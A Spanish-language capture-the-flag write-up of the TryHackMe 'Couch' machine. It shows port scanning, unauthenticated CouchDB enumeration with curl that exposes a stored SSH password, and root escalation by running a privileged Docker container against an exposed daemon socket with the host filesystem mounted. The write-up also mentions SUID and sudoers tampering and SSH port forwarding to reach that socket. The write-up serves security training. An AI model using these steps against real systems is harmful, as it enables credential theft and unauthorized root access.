---
title: Couch (Try Hack Me)
author: J0lm3d0
date: 2021-11-12 12:00:00 +0200
categories: [TryHackMe]
tags: [linux, couchdb, docker]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Couch de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.

![Logo de la máquina](/assets/img/THM/Couch/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_Couch.pdf)

## Enumeración de servicios y recopilación de información sensible

Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```
# nmap -p- --open -T5 -n -vv 10.10.141.129

Not shown: 65182 closed ports, 351 filtered ports
Reason: 65182 resets and 351 no-responses
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5984/tcp open  couchdb syn-ack ttl 63
```

Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```bash
# nmap -p22,5984 -sC -sV 10.10.141.129

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Veo que, aparte del servicio SSH, nos encontramos un servicio `Apache CouchDb`, que se trata una base de datos de documentos NoSQL de código abierto que recopila y almacena datos en documentos basados en JSON. A diferencia de las bases de datos relacionales, CouchDB utiliza un modelo de datos sin esquema, que simplifica la gestión de registros en varios dispositivos informáticos. Al detectar la versión utilizada en el escaneo, pruebo a buscar exploits mediante la herramienta `SearchSploit`, encontrando un exploit que puede aplicar en dicha versión.

```
# searchsploit couchdb 1.6.1
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache CouchDB < 2.1.0 - Remote Code Execution                                                                                                                                                           | linux/webapps/44913.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Pero, tras hacer varias pruebas, compruebo que la vulnerabilidad que explota este script está subsanada o no aplica, ya que al realizar la petición POST que ejecutaría el comando, me da una respuesta "401 Unauthorized". Para continuar, accedo al servicio a través del navegador.

![Página principal del servidor web](/assets/img/THM/Couch/mainpage.png)

Buscando información en internet, encuentro el siguiente [artículo](https://book.hacktricks.xyz/pentesting/5984-pentesting-couchdb) en el que se explica como enumerar de forma manual las bases de datos de CouchDB a través de peticiones HTTP. A continuación, se ve el listado de bases de datos creadas, de las cuales las que más me llaman la atención son "_users" y "secret".

```
# curl -s -X GET http://10.10.141.129:5984/_all_dbs | jq
[
  "_replicator",
  "_users",
  "couch",
  "secret",
  "test_suite_db",
  "test_suite_db2"
]
```

## Acceso a la máquina

Tras enumerar más a fondo esas 2 bases de datos, encuentro en "secret" un documento que contiene una variable "passwordbackup" con unas credenciales.

```
# curl -s -X GET http://10.10.141.129:5984/secret/a1320dd69fb4570d0a3d26df4e000be7 | jq
{
  "_id": "a1320dd69fb4570d0a3d26df4e000be7",
  "_rev": "2-57b28bd986d343cacd9cb3fca0b20c46",
  "passwordbackup": "atena:t4*******N##"
}
```

Con las credenciales obtenidas, logro conectarme a la máquina por SSH y obtengo la primera flag.

```
atena@ubuntu:~$ cat user.txt

THM{********_*******}
```

## Escalada de privilegios

Enumerando el sistema para escalar privilegios, descubro que root está ejecutando un contenedor de Docker. Además, en el histórico de "bash" había encontrado un comando en el que se ejecutaba un contenedor de Docker con privilegios.

```
atena@ubuntu:~$ ps -faux

root       821  0.0  1.2 395632  6424 ?        Ssl  11:42   0:02 /usr/bin/containerd
root       827  0.0  2.6 451700 13028 ?        Ssl  11:42   0:04 /usr/bin/dockerd -H=fd:// -H=tcp://127.0.0.1:2375

atena@ubuntu:~$ cat .bash_history

docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

Al volver a desplegar el histórico para copiar el comando, veo que se está creando una carpeta compartida en el directorio "/mnt" del contenedor, que contendrá el directorio raíz de la máquina anfitrión. Por tanto, al acceder al contenedor como root, puedo visualizar la flag que se encuentra en la máquina "host" en la ruta "/mnt/root/root.txt". Para conseguir una shell en la máquina anfitrión, solo tendría que, por ejemplo, asignar un permiso SUID a cualquier binario que permita obtener una shell o editar el fichero "/etc/sudoers" para que el usuario "atena", no privilegiado, pueda ejecutar comandos como root sin proporcionar contraseña.

```
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

/ # id

uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

/ # cat /mnt/root/root.txt 

THM{***_*****_******_***}
```

Además, a modo de curiosidad, explico una forma para poder ejecutar el contenedor de la máquina víctima en nuestra máquina de atacante en este caso.

Al ver el proceso de Docker en el listado de procesos, observo que emplea la flag -H, utilizada para indicar el socket del demonio (daemon) de Docker al que se debe conectar el contenedor. El daemon de Docker es capaz de comunicarse con la API de Docker a través de 3 difentes tipos de socket: "unix", "tcp" y "fd". En este caso, se especificaban 2 tipos, un socket "fd" y un socket "tcp" que apuntaba a la propia máquina (localhost) por el puerto 2375.

De esta forma, como cuento con credenciales para el servicio SSH, podría realizar un Local Port Forwarding de tal forma que el puerto 2375 de mi máquina reenvíase las peticiones al puerto 2375 de la máquina víctima. De esta forma, podría lanzar el contenedor de docker en mi propia máquina.

![Local Port Forwarding del puerto 2375 mediante SSH](/assets/img/THM/Couch/lpf.png)

![Ejecutamos el contenedor en nuestra máquina de atacante](/assets/img/THM/Couch//offsecdocker.png)

Más información en la web de [Docker](https://docs.docker.com/engine/reference/commandline/dockerd/).